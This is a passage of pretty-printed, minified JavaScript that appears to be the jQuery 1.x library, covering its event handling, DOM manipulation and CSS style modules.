                            l.remove && l.remove.call(a, g));
                        i && !m.length && (l.teardown && l.teardown.call(a, p, r.handle) !== !1 || n.removeEvent(a, o, r.handle),
                        delete k[o])
                    } else
                        for (o in k)
                            n.event.remove(a, o + b[j], c, d, !0);
                n.isEmptyObject(k) && (delete r.handle,
                n._removeData(a, "events"))
            }
        },
        trigger: function(b, c, e, f) {
            var g, h, i, j, l, m, o, p = [e || d], q = k.call(b, "type") ? b.type : b, r = k.call(b, "namespace") ? b.namespace.split(".") : [];
            if (i = m = e = e || d,
            3 !== e.nodeType && 8 !== e.nodeType && !na.test(q + n.event.triggered) && (q.indexOf(".") > -1 && (r = q.split("."),
            q = r.shift(),
            r.sort()),
            h = q.indexOf(":") < 0 && "on" + q,
            b = b[n.expando] ? b : new n.Event(q,"object" == typeof b && b),
            b.isTrigger = f ? 2 : 3,
            b.namespace = r.join("."),
            b.rnamespace = b.namespace ? new RegExp("(^|\\.)" + r.join("\\.(?:.*\\.|)") + "(\\.|$)") : null,
            b.result = void 0,
            b.target || (b.target = e),
            c = null == c ? [b] : n.makeArray(c, [b]),
            l = n.event.special[q] || {},
            f || !l.trigger || l.trigger.apply(e, c) !== !1)) {
                if (!f && !l.noBubble && !n.isWindow(e)) {
                    for (j = l.delegateType || q,
                    na.test(j + q) || (i = i.parentNode); i; i = i.parentNode)
                        p.push(i),
                        m = i;
                    m === (e.ownerDocument || d) && p.push(m.defaultView || m.parentWindow || a)
                }
                o = 0;
                while ((i = p[o++]) && !b.isPropagationStopped())
                    b.type = o > 1 ? j : l.bindType || q,
                    g = (n._data(i, "events") || {})[b.type] && n._data(i, "handle"),
                    g && g.apply(i, c),
                    g = h && i[h],
                    g && g.apply && M(i) && (b.result = g.apply(i, c),
                    b.result === !1 && b.preventDefault());
                if (b.type = q,
                !f && !b.isDefaultPrevented() && (!l._default || l._default.apply(p.pop(), c) === !1) && M(e) && h && e[q] && !n.isWindow(e)) {
                    m = e[h],
                    m && (e[h] = null),
                    n.event.triggered = q;
                    try {
                        e[q]()
                    } catch (s) {}
                    n.event.triggered = void 0,
                    m && (e[h] = m)
                }
                return b.result
            }
        },
        dispatch: function(a) {
            a = n.event.fix(a);
            var b, c, d, f, g, h = [], i = e.call(arguments), j = (n._data(this, "events") || {})[a.type] || [], k = n.event.special[a.type] || {};
            if (i[0] = a,
            a.delegateTarget = this,
            !k.preDispatch || k.preDispatch.call(this, a) !== !1) {
                h = n.event.handlers.call(this, a, j),
                b = 0;
                while ((f = h[b++]) && !a.isPropagationStopped()) {
                    a.currentTarget = f.elem,
                    c = 0;
                    while ((g = f.handlers[c++]) && !a.isImmediatePropagationStopped())
                        a.rnamespace && !a.rnamespace.test(g.namespace) || (a.handleObj = g,
                        a.data = g.data,
                        d = ((n.event.special[g.origType] || {}).handle || g.handler).apply(f.elem, i),
                        void 0 !== d && (a.result = d) === !1 && (a.preventDefault(),
                        a.stopPropagation()))
                }
                return k.postDispatch && k.postDispatch.call(this, a),
                a.result
            }
        },
        handlers: function(a, b) {
            var c, d, e, f, g = [], h = b.delegateCount, i = a.target;
            if (h && i.nodeType && ("click" !== a.type || isNaN(a.button) || a.button < 1))
                for (; i != this; i = i.parentNode || this)
                    if (1 === i.nodeType && (i.disabled !== !0 || "click" !== a.type)) {
                        for (d = [],
                        c = 0; h > c; c++)
                            f = b[c],
                            e = f.selector + " ",
                            void 0 === d[e] && (d[e] = f.needsContext ? n(e, this).index(i) > -1 : n.find(e, this, null, [i]).length),
                            d[e] && d.push(f);
                        d.length && g.push({
                            elem: i,
                            handlers: d
                        })
                    }
            return h < b.length && g.push({
                elem: this,
                handlers: b.slice(h)
            }),
            g
        },
        fix: function(a) {
            if (a[n.expando])
                return a;
            var b, c, e, f = a.type, g = a, h = this.fixHooks[f];
            h || (this.fixHooks[f] = h = ma.test(f) ? this.mouseHooks : la.test(f) ? this.keyHooks : {}),
            e = h.props ? this.props.concat(h.props) : this.props,
            a = new n.Event(g),
            b = e.length;
            while (b--)
                c = e[b],
                a[c] = g[c];
            return a.target || (a.target = g.srcElement || d),
            3 === a.target.nodeType && (a.target = a.target.parentNode),
            a.metaKey = !!a.metaKey,
            h.filter ? h.filter(a, g) : a
        },
        props: "altKey bubbles cancelable ctrlKey currentTarget detail eventPhase metaKey relatedTarget shiftKey target timeStamp view which".split(" "),
        fixHooks: {},
        keyHooks: {
            props: "char charCode key keyCode".split(" "),
            filter: function(a, b) {
                return null == a.which && (a.which = null != b.charCode ? b.charCode : b.keyCode),
                a
            }
        },
        mouseHooks: {
            props: "button buttons clientX clientY fromElement offsetX offsetY pageX pageY screenX screenY toElement".split(" "),
            filter: function(a, b) {
                var c, e, f, g = b.button, h = b.fromElement;
                return null == a.pageX && null != b.clientX && (e = a.target.ownerDocument || d,
                f = e.documentElement,
                c = e.body,
                a.pageX = b.clientX + (f && f.scrollLeft || c && c.scrollLeft || 0) - (f && f.clientLeft || c && c.clientLeft || 0),
                a.pageY = b.clientY + (f && f.scrollTop || c && c.scrollTop || 0) - (f && f.clientTop || c && c.clientTop || 0)),
                !a.relatedTarget && h && (a.relatedTarget = h === a.target ? b.toElement : h),
                a.which || void 0 === g || (a.which = 1 & g ? 1 : 2 & g ? 3 : 4 & g ? 2 : 0),
                a
            }
        },
        special: {
            load: {
                noBubble: !0
            },
            focus: {
                trigger: function() {
                    if (this !== ra() && this.focus)
                        try {
                            return this.focus(),
                            !1
                        } catch (a) {}
                },
                delegateType: "focusin"
            },
            blur: {
                trigger: function() {
                    return this === ra() && this.blur ? (this.blur(),
                    !1) : void 0
                },
                delegateType: "focusout"
            },
            click: {
                trigger: function() {
                    return n.nodeName(this, "input") && "checkbox" === this.type && this.click ? (this.click(),
                    !1) : void 0
                },
                _default: function(a) {
                    return n.nodeName(a.target, "a")
                }
            },
            beforeunload: {
                postDispatch: function(a) {
                    void 0 !== a.result && a.originalEvent && (a.originalEvent.returnValue = a.result)
                }
            }
        },
        simulate: function(a, b, c) {
            var d = n.extend(new n.Event, c, {
                type: a,
                isSimulated: !0
            });
            n.event.trigger(d, null, b),
            d.isDefaultPrevented() && c.preventDefault()
        }
    },
    n.removeEvent = d.removeEventListener ? function(a, b, c) {
        a.removeEventListener && a.removeEventListener(b, c)
    }
    : function(a, b, c) {
        var d = "on" + b;
        a.detachEvent && ("undefined" == typeof a[d] && (a[d] = null),
        a.detachEvent(d, c))
    }
    ,
    n.Event = function(a, b) {
        return this instanceof n.Event ? (a && a.type ? (this.originalEvent = a,
        this.type = a.type,
        this.isDefaultPrevented = a.defaultPrevented || void 0 === a.defaultPrevented && a.returnValue === !1 ? pa : qa) : this.type = a,
        b && n.extend(this, b),
        this.timeStamp = a && a.timeStamp || n.now(),
        void (this[n.expando] = !0)) : new n.Event(a,b)
    }
    ,
    n.Event.prototype = {
        constructor: n.Event,
        isDefaultPrevented: qa,
        isPropagationStopped: qa,
        isImmediatePropagationStopped: qa,
        preventDefault: function() {
            var a = this.originalEvent;
            this.isDefaultPrevented = pa,
            a && (a.preventDefault ? a.preventDefault() : a.returnValue = !1)
        },
        stopPropagation: function() {
            var a = this.originalEvent;
            this.isPropagationStopped = pa,
            a && !this.isSimulated && (a.stopPropagation && a.stopPropagation(),
            a.cancelBubble = !0)
        },
        stopImmediatePropagation: function() {
            var a = this.originalEvent;
            this.isImmediatePropagationStopped = pa,
            a && a.stopImmediatePropagation && a.stopImmediatePropagation(),
            this.stopPropagation()
        }
    },
    n.each({
        mouseenter: "mouseover",
        mouseleave: "mouseout",
        pointerenter: "pointerover",
        pointerleave: "pointerout"
    }, function(a, b) {
        n.event.special[a] = {
            delegateType: b,
            bindType: b,
            handle: function(a) {
                var c, d = this, e = a.relatedTarget, f = a.handleObj;
                return e && (e === d || n.contains(d, e)) || (a.type = f.origType,
                c = f.handler.apply(this, arguments),
                a.type = b),
                c
            }
        }
    }),
    l.submit || (n.event.special.submit = {
        setup: function() {
            return n.nodeName(this, "form") ? !1 : void n.event.add(this, "click._submit keypress._submit", function(a) {
                var b = a.target
                  , c = n.nodeName(b, "input") || n.nodeName(b, "button") ? n.prop(b, "form") : void 0;
                c && !n._data(c, "submit") && (n.event.add(c, "submit._submit", function(a) {
                    a._submitBubble = !0
                }),
                n._data(c, "submit", !0))
            })
        },
        postDispatch: function(a) {
            a._submitBubble && (delete a._submitBubble,
            this.parentNode && !a.isTrigger && n.event.simulate("submit", this.parentNode, a))
        },
        teardown: function() {
            return n.nodeName(this, "form") ? !1 : void n.event.remove(this, "._submit")
        }
    }),
    l.change || (n.event.special.change = {
        setup: function() {
            return ka.test(this.nodeName) ? ("checkbox" !== this.type && "radio" !== this.type || (n.event.add(this, "propertychange._change", function(a) {
                "checked" === a.originalEvent.propertyName && (this._justChanged = !0)
            }),
            n.event.add(this, "click._change", function(a) {
                this._justChanged && !a.isTrigger && (this._justChanged = !1),
                n.event.simulate("change", this, a)
            })),
            !1) : void n.event.add(this, "beforeactivate._change", function(a) {
                var b = a.target;
                ka.test(b.nodeName) && !n._data(b, "change") && (n.event.add(b, "change._change", function(a) {
                    !this.parentNode || a.isSimulated || a.isTrigger || n.event.simulate("change", this.parentNode, a)
                }),
                n._data(b, "change", !0))
            })
        },
        handle: function(a) {
            var b = a.target;
            return this !== b || a.isSimulated || a.isTrigger || "radio" !== b.type && "checkbox" !== b.type ? a.handleObj.handler.apply(this, arguments) : void 0
        },
        teardown: function() {
            return n.event.remove(this, "._change"),
            !ka.test(this.nodeName)
        }
    }),
    l.focusin || n.each({
        focus: "focusin",
        blur: "focusout"
    }, function(a, b) {
        var c = function(a) {
            n.event.simulate(b, a.target, n.event.fix(a))
        };
        n.event.special[b] = {
            setup: function() {
                var d = this.ownerDocument || this
                  , e = n._data(d, b);
                e || d.addEventListener(a, c, !0),
                n._data(d, b, (e || 0) + 1)
            },
            teardown: function() {
                var d = this.ownerDocument || this
                  , e = n._data(d, b) - 1;
                e ? n._data(d, b, e) : (d.removeEventListener(a, c, !0),
                n._removeData(d, b))
            }
        }
    }),
    n.fn.extend({
        on: function(a, b, c, d) {
            return sa(this, a, b, c, d)
        },
        one: function(a, b, c, d) {
            return sa(this, a, b, c, d, 1)
        },
        off: function(a, b, c) {
            var d, e;
            if (a && a.preventDefault && a.handleObj)
                return d = a.handleObj,
                n(a.delegateTarget).off(d.namespace ? d.origType + "." + d.namespace : d.origType, d.selector, d.handler),
                this;
            if ("object" == typeof a) {
                for (e in a)
                    this.off(e, b, a[e]);
                return this
            }
            return b !== !1 && "function" != typeof b || (c = b,
            b = void 0),
            c === !1 && (c = qa),
            this.each(function() {
                n.event.remove(this, a, c, b)
            })
        },
        trigger: function(a, b) {
            return this.each(function() {
                n.event.trigger(a, b, this)
            })
        },
        triggerHandler: function(a, b) {
            var c = this[0];
            return c ? n.event.trigger(a, b, c, !0) : void 0
        }
    });
    var ta = / jQuery\d+="(?:null|\d+)"/g
      , ua = new RegExp("<(?:" + ba + ")[\\s/>]","i")
      , va = /<(?!area|br|col|embed|hr|img|input|link|meta|param)(([\w:-]+)[^>]*)\/>/gi
      , wa = /<script|<style|<link/i
      , xa = /checked\s*(?:[^=]|=\s*.checked.)/i
      , ya = /^true\/(.*)/
      , za = /^\s*<!(?:\[CDATA\[|--)|(?:\]\]|--)>\s*$/g
      , Aa = ca(d)
      , Ba = Aa.appendChild(d.createElement("div"));
    function Ca(a, b) {
        return n.nodeName(a, "table") && n.nodeName(11 !== b.nodeType ? b : b.firstChild, "tr") ? a.getElementsByTagName("tbody")[0] || a.appendChild(a.ownerDocument.createElement("tbody")) : a
    }
    function Da(a) {
        return a.type = (null !== n.find.attr(a, "type")) + "/" + a.type,
        a
    }
    function Ea(a) {
        var b = ya.exec(a.type);
        return b ? a.type = b[1] : a.removeAttribute("type"),
        a
    }
    function Fa(a, b) {
        if (1 === b.nodeType && n.hasData(a)) {
            var c, d, e, f = n._data(a), g = n._data(b, f), h = f.events;
            if (h) {
                delete g.handle,
                g.events = {};
                for (c in h)
                    for (d = 0,
                    e = h[c].length; e > d; d++)
                        n.event.add(b, c, h[c][d])
            }
            g.data && (g.data = n.extend({}, g.data))
        }
    }
    function Ga(a, b) {
        var c, d, e;
        if (1 === b.nodeType) {
            if (c = b.nodeName.toLowerCase(),
            !l.noCloneEvent && b[n.expando]) {
                e = n._data(b);
                for (d in e.events)
                    n.removeEvent(b, d, e.handle);
                b.removeAttribute(n.expando)
            }
            "script" === c && b.text !== a.text ? (Da(b).text = a.text,
            Ea(b)) : "object" === c ? (b.parentNode && (b.outerHTML = a.outerHTML),
            l.html5Clone && a.innerHTML && !n.trim(b.innerHTML) && (b.innerHTML = a.innerHTML)) : "input" === c && Z.test(a.type) ? (b.defaultChecked = b.checked = a.checked,
            b.value !== a.value && (b.value = a.value)) : "option" === c ? b.defaultSelected = b.selected = a.defaultSelected : "input" !== c && "textarea" !== c || (b.defaultValue = a.defaultValue)
        }
    }
    function Ha(a, b, c, d) {
        b = f.apply([], b);
        var e, g, h, i, j, k, m = 0, o = a.length, p = o - 1, q = b[0], r = n.isFunction(q);
        if (r || o > 1 && "string" == typeof q && !l.checkClone && xa.test(q))
            return a.each(function(e) {
                var f = a.eq(e);
                r && (b[0] = q.call(this, e, f.html())),
                Ha(f, b, c, d)
            });
        if (o && (k = ja(b, a[0].ownerDocument, !1, a, d),
        e = k.firstChild,
        1 === k.childNodes.length && (k = e),
        e || d)) {
            for (i = n.map(ea(k, "script"), Da),
            h = i.length; o > m; m++)
                g = k,
                m !== p && (g = n.clone(g, !0, !0),
                h && n.merge(i, ea(g, "script"))),
                c.call(a[m], g, m);
            if (h)
                for (j = i[i.length - 1].ownerDocument,
                n.map(i, Ea),
                m = 0; h > m; m++)
                    g = i[m],
                    _.test(g.type || "") && !n._data(g, "globalEval") && n.contains(j, g) && (g.src ? n._evalUrl && n._evalUrl(g.src) : n.globalEval((g.text || g.textContent || g.innerHTML || "").replace(za, "")));
            k = e = null
        }
        return a
    }
    function Ia(a, b, c) {
        for (var d, e = b ? n.filter(b, a) : a, f = 0; null != (d = e[f]); f++)
            c || 1 !== d.nodeType || n.cleanData(ea(d)),
            d.parentNode && (c && n.contains(d.ownerDocument, d) && fa(ea(d, "script")),
            d.parentNode.removeChild(d));
        return a
    }
    n.extend({
        htmlPrefilter: function(a) {
            return a.replace(va, "<$1></$2>")
        },
        clone: function(a, b, c) {
            var d, e, f, g, h, i = n.contains(a.ownerDocument, a);
            if (l.html5Clone || n.isXMLDoc(a) || !ua.test("<" + a.nodeName + ">") ? f = a.cloneNode(!0) : (Ba.innerHTML = a.outerHTML,
            Ba.removeChild(f = Ba.firstChild)),
            !(l.noCloneEvent && l.noCloneChecked || 1 !== a.nodeType && 11 !== a.nodeType || n.isXMLDoc(a)))
                for (d = ea(f),
                h = ea(a),
                g = 0; null != (e = h[g]); ++g)
                    d[g] && Ga(e, d[g]);
            if (b)
                if (c)
                    for (h = h || ea(a),
                    d = d || ea(f),
                    g = 0; null != (e = h[g]); g++)
                        Fa(e, d[g]);
                else
                    Fa(a, f);
            return d = ea(f, "script"),
            d.length > 0 && fa(d, !i && ea(a, "script")),
            d = h = e = null,
            f
        },
        cleanData: function(a, b) {
            for (var d, e, f, g, h = 0, i = n.expando, j = n.cache, k = l.attributes, m = n.event.special; null != (d = a[h]); h++)
                if ((b || M(d)) && (f = d[i],
                g = f && j[f])) {
                    if (g.events)
                        for (e in g.events)
                            m[e] ? n.event.remove(d, e) : n.removeEvent(d, e, g.handle);
                    j[f] && (delete j[f],
                    k || "undefined" == typeof d.removeAttribute ? d[i] = void 0 : d.removeAttribute(i),
                    c.push(f))
                }
        }
    }),
    n.fn.extend({
        domManip: Ha,
        detach: function(a) {
            return Ia(this, a, !0)
        },
        remove: function(a) {
            return Ia(this, a)
        },
        text: function(a) {
            return Y(this, function(a) {
                return void 0 === a ? n.text(this) : this.empty().append((this[0] && this[0].ownerDocument || d).createTextNode(a))
            }, null, a, arguments.length)
        },
        append: function() {
            return Ha(this, arguments, function(a) {
                if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                    var b = Ca(this, a);
                    b.appendChild(a)
                }
            })
        },
        prepend: function() {
            return Ha(this, arguments, function(a) {
                if (1 === this.nodeType || 11 === this.nodeType || 9 === this.nodeType) {
                    var b = Ca(this, a);
                    b.insertBefore(a, b.firstChild)
                }
            })
        },
        before: function() {
            return Ha(this, arguments, function(a) {
                this.parentNode && this.parentNode.insertBefore(a, this)
            })
        },
        after: function() {
            return Ha(this, arguments, function(a) {
                this.parentNode && this.parentNode.insertBefore(a, this.nextSibling)
            })
        },
        empty: function() {
            for (var a, b = 0; null != (a = this[b]); b++) {
                1 === a.nodeType && n.cleanData(ea(a, !1));
                while (a.firstChild)
                    a.removeChild(a.firstChild);
                a.options && n.nodeName(a, "select") && (a.options.length = 0)
            }
            return this
        },
        clone: function(a, b) {
            return a = null == a ? !1 : a,
            b = null == b ? a : b,
            this.map(function() {
                return n.clone(this, a, b)
            })
        },
        html: function(a) {
            return Y(this, function(a) {
                var b = this[0] || {}
                  , c = 0
                  , d = this.length;
                if (void 0 === a)
                    return 1 === b.nodeType ? b.innerHTML.replace(ta, "") : void 0;
                if ("string" == typeof a && !wa.test(a) && (l.htmlSerialize || !ua.test(a)) && (l.leadingWhitespace || !aa.test(a)) && !da[($.exec(a) || ["", ""])[1].toLowerCase()]) {
                    a = n.htmlPrefilter(a);
                    try {
                        for (; d > c; c++)
                            b = this[c] || {},
                            1 === b.nodeType && (n.cleanData(ea(b, !1)),
                            b.innerHTML = a);
                        b = 0
                    } catch (e) {}
                }
                b && this.empty().append(a)
            }, null, a, arguments.length)
        },
        replaceWith: function() {
            var a = [];
            return Ha(this, arguments, function(b) {
                var c = this.parentNode;
                n.inArray(this, a) < 0 && (n.cleanData(ea(this)),
                c && c.replaceChild(b, this))
            }, a)
        }
    }),
    n.each({
        appendTo: "append",
        prependTo: "prepend",
        insertBefore: "before",
        insertAfter: "after",
        replaceAll: "replaceWith"
    }, function(a, b) {
        n.fn[a] = function(a) {
            for (var c, d = 0, e = [], f = n(a), h = f.length - 1; h >= d; d++)
                c = d === h ? this : this.clone(!0),
                n(f[d])[b](c),
                g.apply(e, c.get());
            return this.pushStack(e)
        }
    });
    var Ja, Ka = {
        HTML: "block",
        BODY: "block"
    };
    function La(a, b) {
        var c = n(b.createElement(a)).appendTo(b.body)
          , d = n.css(c[0], "display");
        return c.detach(),
        d
    }
    function Ma(a) {
        var b = d
          , c = Ka[a];
        return c || (c = La(a, b),
        "none" !== c && c || (Ja = (Ja || n("<iframe frameborder='0' width='0' height='0'/>")).appendTo(b.documentElement),
        b = (Ja[0].contentWindow || Ja[0].contentDocument).document,
        b.write(),
        b.close(),
        c = La(a, b),
        Ja.detach()),
        Ka[a] = c),
        c
    }
    var Na = /^margin/
      , Oa = new RegExp("^(" + T + ")(?!px)[a-z%]+$","i")
      , Pa = function(a, b, c, d) {
        var e, f, g = {};
        for (f in b)
            g[f] = a.style[f],
            a.style[f] = b[f];
        e = c.apply(a, d || []);
        for (f in b)
            a.style[f] = g[f];
        return e
    }
      , Qa = d.documentElement;
    !function() {
        var b, c, e, f, g, h, i = d.createElement("div"), j = d.createElement("div");
        if (j.style) {
            j.style.cssText = "float:left;opacity:.5",
            l.opacity = "0.5" === j.style.opacity,
            l.cssFloat = !!j.style.cssFloat,
            j.style.backgroundClip = "content-box",
            j.cloneNode(!0).style.backgroundClip = "",
            l.clearCloneStyle = "content-box" === j.style.backgroundClip,
            i = d.createElement("div"),
            i.style.cssText = "border:0;width:8px;height:0;top:0;left:-9999px;padding:0;margin-top:1px;position:absolute",
            j.innerHTML = "",
            i.appendChild(j),
            l.boxSizing = "" === j.style.boxSizing || "" === j.style.MozBoxSizing || "" === j.style.WebkitBoxSizing,
            n.extend(l, {
                reliableHiddenOffsets: function() {
                    return null == b && k(),
                    f
                },
                boxSizingReliable: function() {
                    return null == b && k(),
                    e
                },
                pixelMarginRight: function() {
                    return null == b && k(),
                    c
                },
                pixelPosition: function() {
                    return null == b && k(),
                    b
                },
                reliableMarginRight: function() {
                    return null == b && k(),
                    g
                },
                reliableMarginLeft: function() {
                    return null == b && k(),
                    h
                }
            });
            function k() {
                var k, l, m = d.documentElement;
                m.appendChild(i),
                j.style.cssText = "-webkit-box-sizing:border-box;box-sizing:border-box;position:relative;display:block;margin:auto;border:1px;padding:1px;top:1%;width:50%",
                b = e = h = !1,
                c = g = !0,
                a.getComputedStyle && (l = a.getComputedStyle(j),
                b = "1%" !== (l || {}).top,
                h = "2px" === (l || {}).marginLeft,
                e = "4px" === (l || {
                    width: "4px"
                }).width,
                j.style.marginRight = "50%",
                c = "4px" === (l || {
                    marginRight: "4px"
                }).marginRight,
                k = j.appendChild(d.createElement("div")),
                k.style.cssText = j.style.cssText = "-webkit-box-sizing:content-box;-moz-box-sizing:content-box;box-sizing:content-box;display:block;margin:0;border:0;padding:0",
                k.style.marginRight = k.style.width = "0",
                j.style.width = "1px",
                g = !parseFloat((a.getComputedStyle(k) || {}).marginRight),
                j.removeChild(k)),
                j.style.display = "none",
                f = 0 === j.getClientRects().length,
                f && (j.style.display = "",
                j.innerHTML = "<table><tr><td></td><td>t</td></tr></table>",
                j.childNodes[0].style.borderCollapse = "separate",
                k = j.getElementsByTagName("td"),
                k[0].style.cssText = "margin:0;border:0;padding:0;display:none",
                f = 0 === k[0].offsetHeight,
                f && (k[0].style.display = "",
                k[1].style.display = "none",
                f = 0 === k[0].offsetHeight)),
                m.removeChild(i)
            }
        }
    }();
    var Ra, Sa, Ta = /^(top|right|bottom|left)$/;
    a.getComputedStyle ? (Ra = function(b) {
        var c = b.ownerDocument.defaultView;
        return c && c.opener || (c = a),
        c.getComputedStyle(b)
    }
    ,
    Sa = function(a, b, c) {
        var d, e, f, g, h = a.style;
        return c = c || Ra(a),
        g = c ? c.getPropertyValue(b) || c[b] : void 0,
        "" !== g && void 0 !== g || n.contains(a.ownerDocument, a) || (g = n.style(a, b)),
        c && !l.pixelMarginRight() && Oa.test(g) && Na.test(b) && (d = h.width,
        e = h.minWidth,
        f = h.maxWidth,
        h.minWidth = h.maxWidth = h.width = g,
        g = c.width,
        h.width = d,
        h.minWidth = e,
        h.maxWidth = f),
        void 0 === g ? g : g + ""
    }
    ) : Qa.currentStyle && (Ra = function(a) {
        return a.currentStyle
    }
    ,
    Sa = function(a, b, c) {
        var d, e, f, g, h = a.style;
        return c = c || Ra(a),
        g = c ? c[b] : void 0,
        null == g && h && h[b] && (g = h[b]),
        Oa.test(g) && !Ta.test(b) && (d = h.left,
        e = a.runtimeStyle,
        f = e && e.left,
        f && (e.left = a.currentStyle.left),
        h.left = "fontSize" === b ? "1em" : g,
        g = h.pixelLeft + "px",
        h.left = d,
        f && (e.left = f)),
        void 0 === g ? g : g + "" || "auto"
    }
    );
    function Ua(a, b) {
        return {
            get: function() {
                return a() ? void delete this.get : (this.get = b).apply(this, arguments)
            }
        }
    }
    var Va = /alpha\([^)]*\)/i
      , Wa = /opacity\s*=\s*([^)]*)/i
      , Xa = /^(none|table(?!-c[ea]).+)/
      , Ya = new RegExp("^(" + T + ")(.*)$","i")
      , Za = {
        position: "absolute",
        visibility: "hidden",
        display: "block"
    }
      , $a = {
        letterSpacing: "0",
        fontWeight: "400"
    }
      , _a = ["Webkit", "O", "Moz", "ms"]
      , ab = d.createElement("div").style;
    function bb(a) {
        if (a in ab)
            return a;
        var b = a.charAt(0).toUpperCase() + a.slice(1)
          , c = _a.length;
        while (c--)
            if (a = _a[c] + b,
            a in ab)
                return a
    }
    function cb(a, b) {
        for (var c, d, e, f = [], g = 0, h = a.length; h > g; g++)
            d = a[g],
            d.style && (f[g] = n._data(d, "olddisplay"),
            c = d.style.display,
            b ? (f[g] || "none" !== c || (d.style.display = ""),
            "" === d.style.display && W(d) && (f[g] = n._data(d, "olddisplay", Ma(d.nodeName)))) : (e = W(d),
            (c && "none" !== c || !e) && n._data(d, "olddisplay", e ? c : n.css(d, "display"))));
        for (g = 0; h > g; g++)
            d = a[g],
            d.style && (b && "none" !== d.style.display && "" !== d.style.display || (d.style.display = b ? f[g] || "" : "none"));
        return a
    }
    function db(a, b, c) {
        var d = Ya.exec(b);
        return d ? Math.max(0, d[1] - (c || 0)) + (d[2] || "px") : b
    }
    function eb(a, b, c, d, e) {
        for (var f = c === (d ? "border" : "content") ? 4 : "width" === b ? 1 : 0, g = 0; 4 > f; f += 2)
            "margin" === c && (g += n.css(a, c + V[f], !0, e)),
            d ? ("content" === c && (g -= n.css(a, "padding" + V[f], !0, e)),
            "margin" !== c && (g -= n.css(a, "border" + V[f] + "Width", !0, e))) : (g += n.css(a, "padding" + V[f], !0, e),
            "padding" !== c && (g += n.css(a, "border" + V[f] + "Width", !0, e)));
        return g
    }
    function fb(a, b, c) {
        var d = !0
          , e = "width" === b ? a.offsetWidth : a.offsetHeight
          , f = Ra(a)
          , g = l.boxSizing && "border-box" === n.css(a, "boxSizing", !1, f);
        if (0 >= e || null == e) {
            if (e = Sa(a, b, f),
            (0 > e || null == e) && (e = a.style[b]),
            Oa.test(e))
                return e;
            d = g && (l.boxSizingReliable() || e === a.style[b]),
            e = parseFloat(e) || 0
        }
        return e + eb(a, b, c || (g ? "border" : "content"), d, f) + "px"
    }
    n.extend({
        cssHooks: {
            opacity: {
                get: function(a, b) {
                    if (b) {
                        var c = Sa(a, "opacity");
                        return "" === c ? "1" : c
                    }
                }
            }
        },
        cssNumber: {
            animationIterationCount: !0,
            columnCount: !0,
            fillOpacity: !0,
            flexGrow: !0,
            flexShrink: !0,
            fontWeight: !0,
            lineHeight: !0,
            opacity: !0,
            order: !0,
            orphans: !0,
            widows: !0,
            zIndex: !0,
            zoom: !0
        },
        cssProps: {
            "float": l.cssFloat ? "cssFloat" : "styleFloat"
        },
        style: function(a, b, c, d) {
            if (a && 3 !== a.nodeType && 8 !== a.nodeType && a.style) {
                var e, f, g, h = n.camelCase(b), i = a.style;
                if (b = n.cssProps[h] || (n.cssProps[h] = bb(h) || h),
                g = n.cssHooks[b] || n.cssHooks[h],
                void 0 === c)
                    return g && "get"in g && void 0 !== (e = g.get(a, !1, d)) ? e : i[b];
                if (f = typeof c,
                "string" === f && (e = U.exec(c)) && e[1] && (c = X(a, b, e),
                f = "number"),
                null != c && c === c && ("number" === f && (c += e && e[3] || (n.cssNumber[h] ? "" : "px")),
                l.clearCloneStyle || "" !== c || 0 !== b.indexOf("background") || (i[b] = "inherit"),
                !(g && "set"in g && void 0 === (c = g.set(a, c, d)))))
                    try {
                        i[b] = c
                    } catch (j) {}
            }
        },
        css: function(a, b, c, d) {
            var e, f, g, h = n.camelCase(b);
            return b = n.cssProps[h] || (n.cssProps[h] = bb(h) || h),
            g = n.cssHooks[b] || n.cssHooks[h],
            g && "get"in g && (f = g.get(a, !0, c)),
            void 0 === f && (f = Sa(a, b, d)),
            "normal" === f && b in $a && (f = $a[b]),
            "" === c || c ? (e = parseFloat(f),
            c === !0 || isFinite(e) ? e || 0 : f) : f
        }
    }),
    n.each(["height", "width"], function(a, b) {
        n.cssHooks[b] = {
            get: function(a, c, d) {
                return c ? Xa.test(n.css(a, "display")) && 0 === a.offsetWidth ? Pa(a, Za, function() {
                    return fb(a, b, d)
                }) : fb(a, b, d) : void 0
            },
            set: function(a, c, d) {
                var e = d && Ra(a);
                return db(a, c, d ? eb(a, b, d, l.boxSizing && "border-box" === n.css(a, "boxSizing", !1, e), e) : 0)
            }
        }
    }),
    l.opacity || (n.cssHooks.opacity = {
        get: function(a, b) {
            return Wa.test((b && a.currentStyle ? a.currentStyle.filter : a.style.filter) || "") ? .01 * parseFloat(RegExp.$1) + "" : b ? "1" : ""
        },
        set: function(a, b) {
            var c = a.style
              , d = a.currentStyle
              , e = n.isNumeric(b) ? "alpha(opacity=" + 100 * b + ")" : ""
              , f = d && d.filter || c.filter || "";
            c.zoom = 1,
            (b >= 1 || "" === b) && "" === n.trim(f.replace(Va, "")) && c.removeAttribute && (c.removeAttribute("filter"),
            "" === b || d && !d.filter) || (c.filter = Va.test(f) ? f.replace(Va, e) : f + " " + e)
        }
    }),
    n.cssHooks.marginRight = Ua(l.reliableMarginRight, function(a, b) {
        return b ? Pa(a, {
            display: "inline-block"
        }, Sa, [a, "marginRight"]) : void 0
    }),
    n.cssHooks.marginLeft = Ua(l.reliableMarginLeft, function(a, b) {
        return b ? (parseFloat(Sa(a, "marginLeft")) || (n.contains(a.ownerDocument, a) ? a.getBoundingClientRect().left - Pa(a, {
            marginLeft: 0
        }, function() {
            return a.getBoundingClientRect().left
        }) : 0)) + "px" : void 0
    }),
    n.each({
        margin: "",
        padding: "",
        border: "Width"
    }, function(a, b) {
        n.cssHooks[a + b] = {
            expand: function(c) {
                for (var d = 0, e = {}, f = "string" == typeof c ? c.split(" ") : [c]; 4 > d; d++)
                    e[a + V[d] + b] = f[d] || f[d - 2] || f[0];
                return e
            }
        },
        Na.test(a) || (n.cssHooks[a + b].set = db)
    }),
    n.fn.extend({
        css: function(a, b) {
            return Y(this, function(a, b, c) {
                var d, e, f = {}, g = 0;
                if (n.isArray(b)) {
                    for (d = Ra(a),
                    e = b.length; e > g; g++)
                        f[b[g]] = n.css(a, b[g], !1, d);
                    return f
                }
                return void 0 !== c ? n.style(a, b, c) : n.css(a, b)
            }, a, b, arguments.length > 1)
        },
        show: function() {
            return cb(this, !0)
        },
        hide: function() {
            return cb(this)
        },
        toggle: function(a) {
            return "boolean" == typeof a ? a ? this.show() : this.hide() : this.each(function() {
                W(this) ? n(this).show() : n(this).hide()
            })
        }
    });
    function gb(a, b, c, d, e) {
        return new gb.prototype.init(a,b,c,d,e)
    }
    n.Tween = gb,
